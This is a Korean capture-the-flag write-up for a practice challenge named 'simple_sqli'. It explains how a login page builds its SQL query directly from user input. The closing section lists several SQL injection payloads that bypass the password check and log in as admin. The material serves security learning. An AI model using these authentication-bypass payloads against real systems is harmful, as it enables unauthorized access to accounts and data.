## 📍simple_sqli

```
로그인 서비스입니다.  
SQL INJECTION 취약점을 통해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.
```

관리자 계정으로 로그인하면 화면에 FLAG가 출력된다.

#### 소스코드

**login** 페이지는 입력받은 `userid`, `userpassword`를 DB에서 조회하고 이에 해당하는 데이터가 있는 경우 로그인을 수행한다.
![[{B607DA3B-7FF6-44E6-85A9-E69B1C77D59B}.png]]

admin 계정의 비밀번호는 랜덤 16바이트의 문자열이기 때문에 값을 예상할 수 없다.


#### 취약점

login 페이지에서 `userid`와 `userpassword`를 이용자에게 입력받고, 동적으로 쿼리문을 생성한 뒤 `query_db` 함수에서 DB에 질의한다.
이렇듯 동적으로 생성한 쿼리를 **RawQuery**라고 한다.
RawQuery를 생성할 때 이용자의 입력값이 쿼리문에 그대로 포함되면 SQL Injection 취약점에 노출될 수 있다.
(이용자의 입력값을 검사하는 과정이 없음)
임의의 쿼리문을 `userid` 또는 `userpassword`에 삽입해 SQL Injection 공격을 시도한다.


#### 해결

로그인을 위해 실행하는 쿼리문: `SELECT * FROM users WHERE userid="{userid}" AND userpassword="{userpassword}";`

`userpassword`를 검사하는 과정을 생략할 수 있게 다음과 같이 입력한다.

![[{1E865DA1-F5C1-4F4A-B84C-083A3E3BF6F3}.png]]

![[{CD50907D-64F4-4751-8675-417225786EE2}.png]]


#### 다른 해결법

```sql
/* userid 검색조건 뒤에 OR 조건을 추가해 뒷 내용이 뭐든 admin 반환 */
SELECT * FROM users WHERE userid="admin" or "1" AND userpassword=""
/* userid 검색조건에 admin, userpassword에 임의 값을 입력하고 OR 조건을 추가 */
SELECT * FROM users WHERE userid="admin" AND userpassword="" OR userid="admin"
/* userid 검색조건 뒤에 OR 1을 추가해 테이블의 모든 내용을 반환하도록 하고, LIMIT 절을 이용해 두 번째 Row인 admin을 반환하도록 함 */
SELECT * FROM users WHERE userid="" or 1 LIMIT 1,1-- " AND userpassword=""
```